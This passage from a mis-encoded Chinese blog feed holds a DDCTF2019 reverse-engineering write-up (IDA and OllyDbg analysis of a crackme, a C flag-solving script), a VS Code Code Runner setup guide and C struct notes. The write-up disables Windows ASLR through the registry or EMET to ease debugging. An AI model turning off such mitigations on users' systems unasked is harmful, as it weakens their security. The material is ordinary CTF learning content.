â€“ç™¾åº¦ç™¾ç§‘<br>éšååˆæŸ¥è¯¢åˆ°win7ä»¥åçš„windowsç³»ç»Ÿéƒ½æ˜¯æœ‰è¿™ä¸ªæœºåˆ¶çš„ï¼Œ<strong>ä½†å› ä¸ºæœ‰å®ƒçš„å­˜åœ¨æ¯æ¬¡odè½½å…¥æ—¶ï¼Œå…¶æ˜ åƒåŸºå€éƒ½æ˜¯ä¼šå˜åŒ–çš„ï¼Œè€Œä½ æœ‰æ—¶å€™éœ€è¦è®¡ç®—ä¸€äº›åœ°å€ï¼ŒåŸºå€è€æ˜¯å˜</strong>ã€‚ä»¥å‰æˆ‘æ˜¯ä¸çŸ¥é“è¿™ä¸ªçš„ï¼ŒçŸ¥é“ä»¥åæ„Ÿè§‰è¿™ä¸ªæ˜¯æ›´åŠ åˆ©äºå¯¹ç¨‹åºçš„åˆ†æï¼Œå°±æƒ³ç€ç›´æ¥å…³é—­windows7çš„ASLRã€‚</p><h4 id="å…³é—­ASLR"><a href="#å…³é—­ASLR" class="headerlink" title="å…³é—­ASLR"></a>å…³é—­ASLR</h4><p>æœ‰ä¸¤ç§åŠæ³•ã€‚</p><h5 id="æ”¹æ³¨å†Œè¡¨"><a href="#æ”¹æ³¨å†Œè¡¨" class="headerlink" title="æ”¹æ³¨å†Œè¡¨"></a>æ”¹æ³¨å†Œè¡¨</h5><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739848952944.jpg" srcset="/img/loading.gif" alt="-w901"><br>æ³¨å†Œè¡¨æ·»åŠ äº†ä¸€ä¸ªDWORDé”®å€¼é¡¹ï¼Œå…¶å€¼ä¸º0ã€‚æ³¨æ„å…¶åç§°å’Œè·¯å¾„ã€‚</p><h5 id="è½¯ä»¶å…³é—­"><a href="#è½¯ä»¶å…³é—­" class="headerlink" title="è½¯ä»¶å…³é—­"></a>è½¯ä»¶å…³é—­</h5><p>ä¸‹è½½EMETï¼š<a href="https://www.updatestar.com/directdownload/emet/2258274" target="_blank" rel="noopener">https://www.updatestar.com/directdownload/emet/2258274</a><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739850550859.jpg" srcset="/img/loading.gif" alt="-w730"><br>å…³é—­åé‡å¯å³å¯ã€‚</p><h4 id="æˆåŠŸè¿è¡Œ"><a href="#æˆåŠŸè¿è¡Œ" class="headerlink" title="æˆåŠŸè¿è¡Œ"></a>æˆåŠŸè¿è¡Œ</h4><p>ç¨‹åºæˆåŠŸè¿è¡Œåå‘ç°ï¼š<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739851761277.jpg" srcset="/img/loading.gif" alt="-w499"><br>è¿™ä¸ªä¼°è®¡åˆæ˜¯å­—ç¬¦å¯¹æ¯”ã€‚ç”¨IDAæ‰“å¼€åˆ†æå…¶é€»è¾‘ã€‚</p><h3 id="IDAé™æ€åˆ†æ"><a href="#IDAé™æ€åˆ†æ" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><h4 id="ä¸»å‡½æ•°"><a href="#ä¸»å‡½æ•°" class="headerlink" title="ä¸»å‡½æ•°"></a>ä¸»å‡½æ•°</h4><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&#39;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre><p>ä»£ç å¾ˆç®€å•ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨æ¥å—è¾“å…¥åï¼Œç»è¿‡sub_401000å‡½æ•°åˆ†å¤„ç†åä¸DDCTF{reverseME}å¯¹æ¯”ï¼Œæ­£ç¡®å°±è¾“å‡ºYouâ€™ve got it!ã€‚</p><h4 id="å¤„ç†å‡½æ•°sub-401000"><a href="#å¤„ç†å‡½æ•°sub-401000" class="headerlink" title="å¤„ç†å‡½æ•°sub_401000"></a>å¤„ç†å‡½æ•°sub_401000</h4><pre><code>unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int i; // edi  unsigned int result; // eax  const char *v4; // ebx  i = 0;  result = strlen(a1);  if ( result )  {    v4 = (a1 - v1);    do    {      *v1 = byte_402FF8[v1[v4]];      ++i;      ++v1;      result = strlen(a1);    }    while ( i &lt; result );  }  return result;}</code></pre><p>å¯ä»¥çœ‹å‡ºæ¥è¾“å…¥çš„ä¸œè¥¿çš„ç¡®åœ¨è¿™é‡Œè¿›è¡Œäº†ï¼Œä¸€ä½ä½çš„å¤„ç†ã€‚<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858421447.jpg" srcset="/img/loading.gif" alt="-w521"><br>ç”¨è¿™é‡Œçš„å­—ç¬¦ä¸²è¿›è¡Œäº†æ›¿æ¢ã€‚<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858895484.jpg" srcset="/img/loading.gif" alt="-w917"><br>ä½†æ˜¯è·³è½¬æŸ¥çœ‹å‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå‘ç°æœ€ä¸‹æ–¹ä¸€æ®µä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨çš„å­—ç¬¦ä¸²ã€‚é™æ€åˆ†æè‡³æ­¤ï¼Œæ²¡ä»€ä¹ˆæ€è·¯äº†ã€‚ç”¨odæ¥çœ‹çœ‹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šå˜æˆä»€ä¹ˆæ ·ã€‚</p><h3 id="ODåŠ¨æ€åˆ†æ"><a href="#ODåŠ¨æ€åˆ†æ" class="headerlink" title="ODåŠ¨æ€åˆ†æ"></a>ODåŠ¨æ€åˆ†æ</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739860730789.jpg" srcset="/img/loading.gif" alt="-w555"><br>å®šä½åœ¨è¿™ä¸ªå­—ç¬¦ä¸²ä¹‹å‰åº”è¯¥å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥åè¢«å¤„ç†åçš„å­—ç¬¦ä¸²ã€‚<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739861642584.jpg" srcset="/img/loading.gif" alt="-w1006"><br>åœ¨å‰é¢ä¸€ä¸ªå‡½æ•°è¿›è¡Œä¸‹æ–­ç‚¹ï¼Œä¹Ÿå¯ä»¥æ¸…æ¥šçœ‹åˆ°ä»–å°±æ˜¯æˆ‘ä»¬åˆšåˆšè¯´çš„åŠ å¯†å‡½æ•°<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862054229.jpg" srcset="/img/loading.gif" alt="-w334"><br>è¿™å°±æ˜¯ä¸€ä¸ªåœ°å€ã€‚ç„¶åæˆ‘ä»¬è¾“å…¥123æµ‹è¯•<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739862667897.jpg" srcset="/img/loading.gif" alt="-w361"><br>å·²ç»ç©¿è¿›eaxã€‚<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739863094523.jpg" srcset="/img/loading.gif" alt="-w1199"><br>ç›´æ¥F8ä¸è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„å°±çœ‹æ€ä¹ˆå¤„ç†äº†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚å‘ç°å˜æˆäº†<code>mlk</code>ã€‚<br>æŸ¥çœ‹ä¸‹å¯¹åº”çš„ASCIL:<img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739864384097.jpg" srcset="/img/loading.gif" alt="-w544"><br><strong>å¯ä»¥æ˜æ˜¾å‘ç°å¤„ç†å‰çš„å­—ç¬¦ä¸å¤„ç†åçš„å­—ç¬¦ç›¸åŠ éƒ½ç­‰äº158</strong>ã€‚</p><h3 id="è„šæœ¬è§£å¯†"><a href="#è„šæœ¬è§£å¯†" class="headerlink" title="è„šæœ¬è§£å¯†"></a>è„šæœ¬è§£å¯†</h3><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    char arr[]=&quot;DDCTF{reverseME}&quot;;    for (int i = 0; i &lt; strlen(arr); i++)    {        arr[i]=158-arr[i];    }    printf(&quot;%s&quot;,arr);    }</code></pre><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865575323.jpg" srcset="/img/loading.gif" alt="-w250"><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739865898152.jpg" srcset="/img/loading.gif" alt="-w437"><br><strong>%æ˜¯VCç¼–è¯‘çš„å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ä¸ç”¨ä»£å…¥ã€‚</strong></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>åœ¨æŸåœ¨é¢˜ç›®ä¸­ï¼Œé™æ€åˆ†æåŠ å¯†å‡½æ•°æœ‰äº›å›°éš¾çš„æ—¶å€™ï¼Œå¾€å¾€æ²¡æœ‰åŠ¨æ€åˆ†ææ¥çš„å¿«ï¼Œæ„Ÿè§‰åŠ¨é™ç»“åˆåˆ†ææ˜¯å¾ˆå¥½çš„ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vscodeçš„ç®€å•è°ƒæ•™</title>
    <link href="/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/"/>
    <url>/2019/11/15/Vs%20code%E7%9A%84%E7%AE%80%E5%8D%95%E8%B0%83%E6%95%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Vscodeçš„ç®€å•è°ƒæ•™"><a href="#Vscodeçš„ç®€å•è°ƒæ•™" class="headerlink" title="Vscodeçš„ç®€å•è°ƒæ•™"></a>Vscodeçš„ç®€å•è°ƒæ•™</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>VScodeæ˜¯æ¯”è¾ƒé€‚åˆè‡ªå·±ä½¿ç”¨çš„ï¼Œå› ä¸ºéå¸¸çš„ç®€æ´ä¸”ä¸è‡ƒè‚¿ï¼Œæ‹“å±•æ€§è¿˜å¥½ã€‚å¹¶ä¸”è‡ªå·±å¸¸å†™ä»£ç æ˜¯å°±æ˜¯ä¸ºäº†è¾“å…¥è¾“å‡ºå®ç°æŸäº›åŠŸèƒ½ï¼ŒåŸºæœ¬ç”¨ä¸åˆ°è°ƒè¯•åŠŸèƒ½ã€‚ä½†ç¢äºéš¾ä»¥é…ç½®å„ç§ç¯å¢ƒï¼Œä¸€ç›´æ²¡æœ‰ç”¨ä¸Šï¼Œå¤±è´¥äº†å¾ˆå¤šæ¬¡ã€‚ç°åœ¨åˆå­¦ç€æ•´äº†ä¸€ä¸‹ï¼Œç°åœ¨å·²ç»åƒä¸Šäº†vscodeçš„é¦™ã€‚å†™ä¸ªåšå®¢ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¹Ÿå¯ä»¥åˆ†æä¸‹ç»éªŒã€‚</p><h2 id="æ­£å¸¸è®¾ç½®"><a href="#æ­£å¸¸è®¾ç½®" class="headerlink" title="æ­£å¸¸è®¾ç½®"></a>æ­£å¸¸è®¾ç½®</h2><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737872236921.jpg" srcset="/img/loading.gif" alt="-w143"></p><p>åœ¨è¿™é‡Œç‚¹å‡»å®Œè®¾ç½®ä»¥åï¼Œä¼šå‡ºç°ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737872693861.jpg" srcset="/img/loading.gif" alt="-w791"><br>åœ¨è¿™é‡Œå¯ä»¥è®¾ç½®vscodeçš„å„ç§åœ°æ–¹ï¼Œå°±å¦‚å›¾ä¸­ä¸€æ ·ï¼Œéœ€è¦è‡ªå·±æ¢ç´¢ä¸€ä¸‹ï¼Œç„¶åè®¾ç½®æˆè‡ªå·±æƒ³è¦çš„ç»“æœã€‚</p><h2 id="é…ç½®ç¼–è¯‘ç¯å¢ƒ"><a href="#é…ç½®ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¼–è¯‘ç¯å¢ƒ"></a>é…ç½®ç¼–è¯‘ç¯å¢ƒ</h2><p>è¿™é‡Œæˆ‘åªç”¨åˆ°c/c++å’ŒPythonå°±åªè®°å½•è¿™ä¸ªäº†ã€‚<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737878495576.jpg" srcset="/img/loading.gif" alt="-w449"><br>è¾“å…¥C/C++<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737879247492.jpg" srcset="/img/loading.gif" alt="-w676"><br>åœ¨è¿™é‡Œè¿›è¡Œç‚¹ä¸ªinstallã€‚<br>PYthonä¹Ÿæ˜¯åŒæ ·çš„æ“ä½œã€‚</p><h2 id="è®©ä»£ç è·‘èµ·æ¥"><a href="#è®©ä»£ç è·‘èµ·æ¥" class="headerlink" title="è®©ä»£ç è·‘èµ·æ¥"></a>è®©ä»£ç è·‘èµ·æ¥</h2><p>åœ¨åº”ç”¨å•†åº—é‡Œæœç´¢<strong>Code Runner</strong>ã€‚<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737881342794.jpg" srcset="/img/loading.gif" alt="-w653"><br>è¿™ä¸ªæ˜¯ä¸ªç¥å™¨ï¼Œæœ‰äº†å®ƒå°±å¯ä»¥åœ¨vscodeç›´æ¥è¿è¡Œå„ç§ä»£ç ã€‚<br>å®‰è£…å¥½åæŠŠvscodeå…³é—­ï¼Œç„¶åé‡æ–°æ‰“å¼€ã€‚</p><h3 id="æ–°å»ºä¸ªC-C-æ–‡ä»¶ï¼š"><a href="#æ–°å»ºä¸ªC-C-æ–‡ä»¶ï¼š" class="headerlink" title="æ–°å»ºä¸ªC/C++æ–‡ä»¶ï¼š"></a>æ–°å»ºä¸ªC/C++æ–‡ä»¶ï¼š</h3><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737885382202.jpg" srcset="/img/loading.gif" alt="-w677"><br>ç„¶åå³é”®<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737886009237.jpg" srcset="/img/loading.gif" alt="-w287"><br>æ˜¯å¯ä»¥è¿è¡Œä»£ç çš„ã€‚<br>åœ¨å³ä¸Šè§’ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737886490345.jpg" srcset="/img/loading.gif" alt="-w305"><br>è¿™ä¸ªå°ä¸‰è§’ä¹Ÿå¯ä»¥è¿è¡Œä»£ç ã€‚çœ‹ä¸‹æ•ˆæœï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737886695093.jpg" srcset="/img/loading.gif" alt="-w1007"></p><h3 id="æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º"><a href="#æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º" class="headerlink" title="æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º"></a>æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡º</h3><p>æˆ‘ä»¬æ”¹ä¸€ä¸‹ä»£ç ï¼š<br>    #include <iostream><br><br>    int main() {<br>        int a;<br>        scanf(â€œ%dâ€,&amp;a);<br>        printf(â€œhello world!â€);<br><br>    }</iostream></p><p>åœ¨è¿™æ ·ç›´æ¥è¿è¡Œåå‘ç°ï¼š<img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737890616864.jpg" srcset="/img/loading.gif" alt="-w1070"><br>å¡åœ¨è¿è¡Œè¿‡ç¨‹ä¸”æˆ‘ä»¬æ— æ³•è¾“å…¥ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737891086923.jpg" srcset="/img/loading.gif" alt="-w290"><br>è¿™ä¸ªè§£å†³åŠæ³•å°±æ˜¯<strong>æ›´æ”¹ä¸ºç»ˆç«¯è¾“å‡ºå°±å¯ä»¥äº†</strong>ã€‚<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>ç‚¹å‡»é…ç½®æ‰©å±•ä¿¡æ¯ã€‚ä¸‹æ»‘æ‰¾åˆ°ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737893476953.jpg" srcset="/img/loading.gif" alt="-w559"><br>ç„¶åæ‰“ä¸ªå‹¾å°±å¯ä»¥äº†ã€‚<br>è¿è¡Œï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737894451238.jpg" srcset="/img/loading.gif" alt="-w677"><br>å‘ç°æˆåŠŸäº†ï¼Œç„¶åçœ‹ä¸‹å…¶åŸç†å°±æ˜¯å¸®ä½ å¯¹ç»ˆç«¯è¿›è¡Œäº†<br><code>cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test</code>è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œï¼Œå‘ç°å…¶æ˜¯ç”¨gccè¿›è¡Œäº†ç¼–è¯‘ï¼Œmacæ˜¯è‡ªå¸¦clangçš„ï¼Œclangçš„ä¼˜ç‚¹æŒºå¤šçš„ï¼Œ<strong>ä¸”æ”¯æŒè¯­æ³•é”™è¯¯çš„æ£€æµ‹ï¼Œ</strong>ç„¶åå°±æƒ³ç€å»æ”¹ä¸‹è®©å…¶ç”¨clang++æ¥ç¼–è¯‘ã€‚</p><h3 id="è‡ªå®šä¹‰è¿è¡Œé€»è¾‘"><a href="#è‡ªå®šä¹‰è¿è¡Œé€»è¾‘" class="headerlink" title="è‡ªå®šä¹‰è¿è¡Œé€»è¾‘"></a>è‡ªå®šä¹‰è¿è¡Œé€»è¾‘</h3><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737891942172.jpg" srcset="/img/loading.gif" alt="-w479"><br>è¿˜æ˜¯è¿›å…¥è¿™ä¸ªé…ç½®é‡Œé¢ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737897368419.jpg" srcset="/img/loading.gif" alt="-w411"><br>åœ¨settings.jsonä¸­ç¼–è¾‘:</p><pre><code>&quot;code-runner.executorMap&quot; : {       &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;,       &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;,       &quot;php&quot;: &quot;php&quot;,       &quot;python&quot;: &quot;python -u&quot;,       &quot;ruby&quot;: &quot;ruby&quot;,   }</code></pre><h4 id="æˆå“ï¼š"><a href="#æˆå“ï¼š" class="headerlink" title="æˆå“ï¼š"></a>æˆå“ï¼š</h4><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737900505196.jpg" srcset="/img/loading.gif" alt="-w1110"><br>ç›´æ¥ç²˜è´´è¿™æ®µä»£ç æ”¾å…¥è¿™é‡Œé¢ä¿å­˜å°±å¯ä»¥äº†ã€‚</p><h4 id="æ•ˆæœï¼š"><a href="#æ•ˆæœï¼š" class="headerlink" title="æ•ˆæœï¼š"></a>æ•ˆæœï¼š</h4><p><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737901558381.jpg" srcset="/img/loading.gif" alt="-w860"><br>å®ç°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚</p><h3 id="æµ‹è¯•ä¸€ä¸‹Python"><a href="#æµ‹è¯•ä¸€ä¸‹Python" class="headerlink" title="æµ‹è¯•ä¸€ä¸‹Python"></a>æµ‹è¯•ä¸€ä¸‹Python</h3><p>è¿™æ˜¯ç›´æ¥æ–°å»ºçš„ï¼š<br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737904131858.jpg" srcset="/img/loading.gif" alt="-w430"><br><img src="/2019/11/15/Vs codeçš„ç®€å•è°ƒæ•™/images/15737904322136.jpg" srcset="/img/loading.gif" alt="-w465"><br>è¿™æ ·å°±å¯ä»¥ä¸€ä¸ªvscodeè¿è¡Œå„ç§ä»£ç ï¼Œå¯¹äºä¸æ˜¯ä¸“é—¨åšå¼€å‘ï¼Œåªæ˜¯å†™è„šæœ¬çš„ï¼Œå°±æ˜¯ä¸ªç¦éŸ³ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰</title>
    <link href="/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2019/11/12/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰"><a href="#Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰" class="headerlink" title="Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰"></a>Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆäº”ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹ï¼Œåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­è®¤ä¸ºå®¹æ˜“å¿˜è®°ä¸”é‡è¦çš„ä¸œè¥¿ï¼Œæ–¹ä¾¿ä»¥åå¿˜äº†å†æ¥å­¦ä¹ ä¸€ä¸‹ã€‚<strong>é›†ä¸­äºç»“æ„ä½“éƒ¨åˆ†ä»¥åŠç»“æ„ä½“å¯¹é½çš„çŸ¥è¯†ã€‚</strong></p><h2 id="ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ "><a href="#ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ " class="headerlink" title="ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ "></a>ç»“æ„ä½“çš„ä½¿ç”¨ç»ƒä¹ </h2><p>1ã€å®šä¹‰ä¸€ä¸ªç»“æ„ä½“Gamerç”¨æ¥å­˜å‚¨ä¸€ä¸ªæ¸¸æˆä¸­çš„è§’è‰²çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡€å€¼ã€ç­‰çº§ã€åæ ‡ç­‰ä¿¡æ¯    ã€‚<br>è¦æ±‚ï¼š<br>    (1) å…·ä½“åŒ…å«å“ªäº›ä¿¡æ¯è‡ªç”±è®¾è®¡<br>    (2) ä½†è¿™äº›åŒ…å«çš„ç±»å‹ä¸­ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªæˆå‘˜æ˜¯ç»“æ„ä½“ç±»å‹ã€‚<br>    2ã€å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥ç»™è¿™ä¸ªç»“æ„ä½“å˜é‡èµ‹å€¼.<br>3ã€å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥æ˜¾ç¤ºè¿™ä¸ªç»“æ„ä½“å˜é‡çš„æ‰€æœ‰æˆå‘˜ä¿¡æ¯.<br>    #include <iostream><br>    #include &lt;stdio.h&gt;<br>    #include &lt;string.h&gt;<br>    struct point<br>    {<br>        int x;<br>        int y;<br>        int z;<br>    };<br>    struct Gamer<br>    {<br>        char name[20];<br>        int level;<br>        float HP;<br>        point a;<br>    }No1;<br>    void Function()<br>    {<br>        char a[]=â€xiaozhiâ€;<br>        for (int i = 0; i &lt;strlen(a) ; ++i) {<br>            No1.name[i]=a[i];<br>        }<br>        No1.level = 99;<br>        No1.HP = 99.9;<br>        No1.a.x=6;<br>        No1.a.y=5;<br>        No1.a.z=9;<br>    }<br>    void Display()<br>    {<br>        printf(â€œname:%s level:%d HP:%f point:%d %d %d â€œ,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z);<br>    }<br>    int main() {<br>        Function();<br>        Display();<br>        return 0;<br>    }</iostream></p><h2 id="sizeofçš„ä½¿ç”¨"><a href="#sizeofçš„ä½¿ç”¨" class="headerlink" title="sizeofçš„ä½¿ç”¨"></a>sizeofçš„ä½¿ç”¨</h2><h3 id="åŸºæœ¬ç±»å‹çš„sizeof"><a href="#åŸºæœ¬ç±»å‹çš„sizeof" class="headerlink" title="åŸºæœ¬ç±»å‹çš„sizeof"></a>åŸºæœ¬ç±»å‹çš„sizeof</h3><p>å¯ä»¥ä½¿ç”¨ç±»å‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å˜é‡<br>ä¾‹å­ï¼š</p><p>printf(â€œ%d\nâ€,sizeof(char));<br>printf(â€œ%d\nâ€,sizeof(int));<br>printf(â€œ%d\nâ€,sizeof(float));<br>printf(â€œ%d\nâ€,sizeof(double));</p><p>int x = 10;            //å˜é‡<br>printf(â€œ%d\nâ€,sizeof(x));        </p><h3 id="æ•°ç»„ç±»å‹çš„sizeof"><a href="#æ•°ç»„ç±»å‹çš„sizeof" class="headerlink" title="æ•°ç»„ç±»å‹çš„sizeof"></a>æ•°ç»„ç±»å‹çš„sizeof</h3><p>ä¾‹å­ï¼š<br>    char arr1[10] = {0};<br>    short arr2[10] = {0};<br>    int arr3[10] = {0};                </p><pre><code>printf(&quot;%d\n&quot;,sizeof(arr1));                //10printf(&quot;%d\n&quot;,sizeof(arr2));            //    20printf(&quot;%d\n&quot;,sizeof(arr3));            //    40printf(&quot;%d\n&quot;,sizeof(arr1[10]));            //    1printf(&quot;%d\n&quot;,sizeof(arr2[10]));            //    2printf(&quot;%d\n&quot;,sizeof(arr3[10]));                //4</code></pre><p>æ³¨æ„å…¶ä¸­çš„ä¸åŒã€‚</p><h2 id="ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½"><a href="#ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½" class="headerlink" title="ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½"></a>ç»“æ„ä½“ï¼ˆå†…å­˜ï¼‰å¯¹é½</h2><h3 id="ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦æœ‰å†…å­˜å¯¹é½ï¼Ÿ</h3><p>æœ¬è´¨ï¼šæ˜¯è¦æ•ˆç‡è¿˜æ˜¯ç©ºé—´ï¼ŒäºŒé€‰ä¸€çš„ç»“æœ.ç»Ÿç§°æ˜¯æ€§èƒ½ï¼Œè¿˜æœ‰å°ç§»æ¤ç­‰å› ç´ ï¼Œç¼–è¯‘å™¨å¯¹æ•°æ®ç»“æ„è¿›è¡Œäº†å†…å­˜å¯¹é½ã€‚</p><h3 id="pragma-packçš„åŸºæœ¬ç”¨æ³•"><a href="#pragma-packçš„åŸºæœ¬ç”¨æ³•" class="headerlink" title="pragma packçš„åŸºæœ¬ç”¨æ³•"></a>pragma packçš„åŸºæœ¬ç”¨æ³•</h3><p>åœ¨vc6.0++ä¸­é»˜è®¤å€¼æ˜¯8å­—èŠ‚å¯¹é½ã€‚</p><pre><code>    #pragma pack( n )    ç»“æ„ä½“ã€‚    #pragma pack(  